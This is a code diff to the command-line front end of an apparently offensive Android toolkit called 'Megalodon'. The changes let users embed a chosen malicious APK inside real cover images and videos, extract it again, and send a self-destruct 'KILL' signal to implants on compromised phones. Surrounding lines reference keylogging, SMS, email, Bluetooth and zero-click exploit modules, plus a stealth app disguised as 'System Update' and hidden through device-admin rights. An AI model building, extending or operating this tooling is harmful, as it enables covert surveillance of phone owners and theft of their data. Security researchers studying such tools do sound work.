@@ -65,10 +65,13 @@ def show_commands():
   PAYLOAD:
     payload build-apk                        - Build Android APK (Normal/Stealth)
     payload compile-apk                      - Compile APK into installable file
-    payload image                            - Generate image with embedded APK
-    payload video                            - Generate video with embedded APK
+    payload image [apk] [cover_image]        - Embed APK into a real image
+    payload video [apk] [cover_video]        - Embed APK into a real video
     payload apk                              - Generate Android APK (legacy)
     payload web                              - Generate web payload
+
+  EXTRACT:
+    extract payload <media_file>             - Extract APK from image/video
 
   EXPLOIT:
     exploit ip                               - IP/Network exploit (port scan)
@@ -95,7 +98,10 @@ def show_commands():
   target add 192.168.1.100 android Phone1
   scan
   payload build-apk
-  payload image
+  payload compile-apk
+  payload image payloads/android/build/megalodon_signed.apk payloads/images/cover.jpg
+  payload video payloads/android/build/megalodon_signed.apk payloads/videos/cover.mp4
+  extract payload payloads/images/payload.jpg
   listen start
   exploit email
   status
@@ -123,7 +129,7 @@ def main():
                 print("[+] Goodbye!")
                 break
             
-            elif cmd == 'help':
+            elif cmd in ['help', '--help', '-h', '?']:
                 show_commands()
             
             elif cmd == 'target':
@@ -198,7 +204,6 @@ def main():
                 
                 else:
                     print("[-] Usage: target <add|list|show|delete|set>")
-            
             elif cmd == 'listen':
                 if len(parts) < 2:
                     print("[-] Usage: listen <start|stop|status>")
@@ -299,12 +304,16 @@ def main():
                 
                 elif parts[1] == 'image':
                     from modules.payloads.image_payload import generate
-                    result = generate()
+                    apk = parts[2] if len(parts) > 2 else None
+                    cover = parts[3] if len(parts) > 3 else None
+                    result = generate(apk, cover)
                     print(json.dumps(result, indent=2))
                 
                 elif parts[1] == 'video':
                     from modules.payloads.video_payload import generate
-                    result = generate()
+                    apk = parts[2] if len(parts) > 2 else None
+                    cover = parts[3] if len(parts) > 3 else None
+                    result = generate(apk, cover)
                     print(json.dumps(result, indent=2))
                 
                 elif parts[1] == 'web':
@@ -342,6 +351,15 @@ def main():
                 else:
                     print("[-] Unknown payload command")
             
+            elif cmd == 'extract':
+                if len(parts) < 3 or parts[1] != 'payload':
+                    print("[-] Usage: extract payload <media_file>")
+                    print("    Example: extract payload payloads/images/payload.jpg")
+                    continue
+                from modules.payloads.extractor import run as extract_run
+                result = extract_run(parts[2])
+                print(json.dumps(result, indent=2))
+            
             elif cmd == 'exploit':
                 if len(parts) < 2:
                     print("[-] Usage: exploit <ip|sms|email|social|wifi|bluetooth|zero-click>")
@@ -358,7 +376,6 @@ def main():
                     from modules.exploits.sms_exploit import run
                     result = run(megalodon.target)
                     print(json.dumps(result, indent=2))
-                
                 elif method == 'email':
                     if not megalodon.target:
                         print("[-] No target set. Use: target add <email> email")
@@ -517,6 +534,70 @@ def main():
                     from modules.post_exploit.keylogger import get_logs
                     result = get_logs()
                     print(json.dumps(result, indent=2))
+            
+            elif cmd == 'cleanup' or cmd == 'remove' or cmd == 'uninstall':
+                if len(parts) < 2:
+                    print("[-] Usage: cleanup <target_name>")
+                    print("    Example: cleanup MyPhone")
+                    continue
+                
+                target_name = parts[1]
+                print(f"\n🗑️  INITIATING CLEANUP FOR: {target_name}")
+                print("=" * 50)
+                
+                from core.target_manager import TargetManager
+                tm = TargetManager()
+                target = tm.get_target(target_name)
+                
+                if not target:
+                    print(f"[-] Target '{target_name}' not found")
+                    print("[!] Use 'target list' to see available targets")
+                    continue
+                
+                print(f"📍 IP: {target.get('value')}")
+                print(f"📱 OS: {target.get('os')}")
+                
+                session_found = False
+                if listener is not None:
+                    sessions = listener.list_sessions()
+                    target_ip = target.get('value')
+                    
+                    for session in sessions:
+                        session_ip = session['address'][0]
+                        if session_ip == target_ip:
+                            session_found = True
+                            print(f"[+] ✅ Active session found for {target_ip}")
+                            
+                            print("\n🔥 SENDING SELF-DESTRUCT SIGNAL...")
+                            try:
+                                session['connection'].send_command("KILL")
+                                
+                                print("[✓] 🔥 Self-destruct signal sent!")
+                                print("[✓] Payload will self-destruct and delete itself")
+                                print("[✓] Target will be automatically removed from list")
+                                
+                                tm.delete_target(target_name)
+                                print(f"[✓] {target_name} removed from targets list")
+                                
+                            except Exception as e:
+                                print(f"[-] Failed to send kill command: {e}")
+                                print("\n[!] MANUAL REMOVAL REQUIRED:")
+                                print("    On Android: Settings → Apps → Uninstall")
+                            break
+                
+                if not session_found:
+                    print("[-] No active session found for this target")
+                    print("\n📋 MANUAL REMOVAL INSTRUCTIONS:")
+                    print("=" * 50)
+                    print("🔧 ANDROID DEVICE:")
+                    print("  1. Open Settings → Apps")
+                    print("  2. Look for 'System Update' or the app name you used")
+                    print("  3. Tap on it → Uninstall")
+                    print("  4. If hidden: Settings → Security → Device Admin")
+                    print("  5. Remove admin privileges, then uninstall")
+                    print("  6. Check Downloads folder for .apk files")
+                    print("  7. Restart the device")
+                    print("\n✅ After removal, run: target delete " + target_name)
             
             elif cmd == 'status':
                 status = megalodon.get_status()
